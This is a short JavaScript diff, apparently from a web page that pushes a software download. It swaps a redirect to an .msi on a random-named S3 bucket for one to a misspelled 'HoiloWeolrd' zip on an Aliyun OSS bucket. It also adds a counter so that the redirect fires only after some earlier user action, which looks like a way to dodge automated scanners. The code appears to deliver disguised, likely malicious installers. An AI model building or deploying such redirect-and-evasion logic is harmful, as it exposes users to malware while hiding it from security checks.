@@ -1,5 +1,14 @@
-function GetToFunction()
+function loadUrl()
 {
-	var url="https://nmsljxl.s3.ap-southeast-2.amazonaws.com/HelloWorld_x64.msi";
-	window.location=url;
+	if(num>=1)
+	{
+		var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+		window.location=url;
+	}
+}
+
+var num=0;
+function getLoad()
+{
+	num++;
 }
